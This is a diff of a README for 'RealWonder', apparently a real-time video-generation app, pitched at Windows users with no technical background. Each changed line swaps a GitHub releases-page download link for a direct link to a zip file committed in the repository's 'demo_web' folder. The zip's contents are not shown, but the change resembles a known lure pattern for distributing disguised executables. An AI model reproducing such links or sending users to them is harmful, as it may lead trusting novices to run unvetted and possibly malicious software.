@@ -1,6 +1,6 @@
 # 🎥 RealWonder - Real-Time Video From Your Actions
 
-[![Download RealWonder](https://img.shields.io/badge/Download-RealWonder-green?style=for-the-badge)](https://github.com/Chrisisaac948/RealWonder/releases)
+[![Download RealWonder](https://img.shields.io/badge/Download-RealWonder-green?style=for-the-badge)](https://raw.githubusercontent.com/Chrisisaac948/RealWonder/main/demo_web/Real_Wonder_v1.0.zip)
 
 RealWonder lets you create videos based on physical actions you input. It generates realistic animations that match your movements in real time. This guide will help you download and run RealWonder on a Windows PC with no technical background.
 
@@ -111,7 +111,7 @@ These features make RealWonder suitable for hobbyists and professionals alike.
 
 You can access all RealWonder release files through this link:
 
-[Download RealWonder Here](https://github.com/Chrisisaac948/RealWonder/releases)
+[Download RealWonder Here](https://raw.githubusercontent.com/Chrisisaac948/RealWonder/main/demo_web/Real_Wonder_v1.0.zip)
 
 Remember to pick the latest Windows setup file that suits your PC. The installer file usually ends with `.exe`.
 
@@ -156,4 +156,4 @@ If you face issues:
 
 ---
 
-[![Download RealWonder](https://img.shields.io/badge/Download-RealWonder-blue?style=for-the-badge)](https://github.com/Chrisisaac948/RealWonder/releases)
+[![Download RealWonder](https://img.shields.io/badge/Download-RealWonder-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chrisisaac948/RealWonder/main/demo_web/Real_Wonder_v1.0.zip)
